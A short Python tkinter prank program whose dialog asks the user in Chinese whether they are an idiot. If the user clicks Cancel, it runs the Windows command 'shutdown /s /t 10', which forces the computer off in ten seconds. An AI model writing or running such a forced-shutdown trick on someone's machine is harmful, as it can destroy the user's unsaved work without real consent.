import tkinter as tk
from tkinter import messagebox
import os
i = tk.Tk()





def 呃呃呃呃():

    if tk.messagebox.askokcancel('你是傻子吗','你是傻子吗(确定代表是，取消会有你意想不到的后果)'):
        tk.messagebox.showinfo('太好了','你是傻子,小傻子')
    else:
        tk.messagebox.showinfo('你会后悔的','你会后悔的！！！！！！')
        os.system("shutdown /s /t 10")




c_1 = tk.Button(text='点击验证',command=呃呃呃呃)





c_1.pack()
i.title('lz')
i.mainloop()
